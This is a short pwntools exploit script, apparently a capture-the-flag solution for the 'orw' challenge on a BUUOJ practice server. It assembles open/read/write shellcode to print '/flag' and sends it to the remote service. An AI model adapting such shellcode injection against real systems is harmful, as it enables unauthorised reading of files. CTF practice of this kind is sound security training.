from pwn import *
context.log_level = 'debug'
# io = process('./orw')
elf = ELF('./orw')
io = remote('node4.buuoj.cn',27879)
shellcode = shellcraft.open('/flag')
shellcode += shellcraft.read('eax','esp',100)
shellcode += shellcraft.write(1,'esp',100)
shellcode = asm(shellcode)
io.sendafter(b'Give my your shellcode:',shellcode)
io.interactive()